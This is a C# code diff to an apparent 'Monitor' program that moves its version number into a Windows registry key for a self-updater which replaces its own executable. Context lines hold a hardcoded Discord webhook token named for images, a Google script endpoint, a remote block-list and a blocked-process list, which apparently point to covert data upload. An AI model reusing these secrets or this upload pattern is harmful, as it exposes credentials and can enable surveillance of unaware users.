@@ -46,6 +46,7 @@ using System.IO;
 using System.Linq;
 using System.Net.Http;
 using System.Runtime.InteropServices;
+using Microsoft.Win32;
 using System.Text;
 using System.Text.Json;
 using System.Text.RegularExpressions;
@@ -152,7 +153,6 @@ namespace Monitor
         private const string ImageWebhookUrl = "https://discord.com/api/webhooks/1521898764447518802/Y8CtiAzRUJIroO3rnzyVSRClDLIdQsOEVV2HTMgR_d7b9DxqOwfYGOiov7R-Ujeu6UYR";
         private const string GoogleWebhookUrl = "https://script.google.com/macros/s/AKfycbynf7m-zQPvDTrLPp6SlqLE86BY43iClfRq0CjGvvg-OoYMPOn_ty1PCDfnUMJDFzlONQ/exec";
         private const string BlockListGistUrl = "https://gist.githubusercontent.com/crisev/e9e46b188aaf1651daea86c95f363992/raw/gistfile1.txt";
-        private const string CurrentVersion = "1.0.0";
         private static string updateUrl = "";
 
         private static List<string> blockedProcessNames = new List<string> 
@@ -461,10 +461,11 @@ namespace Monitor
                         if (root.TryGetProperty("version", out var versionElement))
                         {
                             string remoteVersion = versionElement.GetString();
-                            if (!string.IsNullOrEmpty(remoteVersion) && remoteVersion != CurrentVersion)
+                            string localVersion = GetLocalVersion();
+                            if (!string.IsNullOrEmpty(remoteVersion) && remoteVersion != localVersion)
                             {
-                                Console.WriteLine($"New version detected: {remoteVersion}. Starting auto-update...");
-                                await UpdateApplicationAsync();
+                                Console.WriteLine($"New version detected: {remoteVersion} (Local: {localVersion}). Starting auto-update...");
+                                await UpdateApplicationAsync(remoteVersion);
                             }
                         }
                     }
@@ -652,7 +653,7 @@ namespace Monitor
             }
         }
 
-        private static async Task UpdateApplicationAsync()
+        private static async Task UpdateApplicationAsync(string remoteVersion)
         {
             try
             {
@@ -738,6 +739,9 @@ namespace Monitor
                 File.Move(currentExe, backupExe);
                 File.Move(newExe, currentExe);
 
+                // Update the local version in the registry so it doesn't loop
+                SetLocalVersion(remoteVersion);
+
                 Console.WriteLine("Update applied successfully. Restarting...");
 
                 // Restart the process
@@ -812,6 +816,41 @@ namespace Monitor
             }
             catch { /* Ignore exceptions */ }
             return activeProcessIds;
+        }
+
+        private static string GetLocalVersion()
+        {
+            try
+            {
+                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\MonitorApp"))
+                {
+                    var val = key.GetValue("Version");
+                    if (val != null) return val.ToString();
+                    
+                    // Default first-run version
+                    key.SetValue("Version", "1.0.0");
+                    return "1.0.0";
+                }
+            }
+            catch
+            {
+                return "1.0.0";
+            }
+        }
+
+        private static void SetLocalVersion(string version)
+        {
+            try
+            {
+                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\MonitorApp"))
+                {
+                    key.SetValue("Version", version);
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Failed to save version to registry: {ex.Message}");
+            }
         }
     }
 }
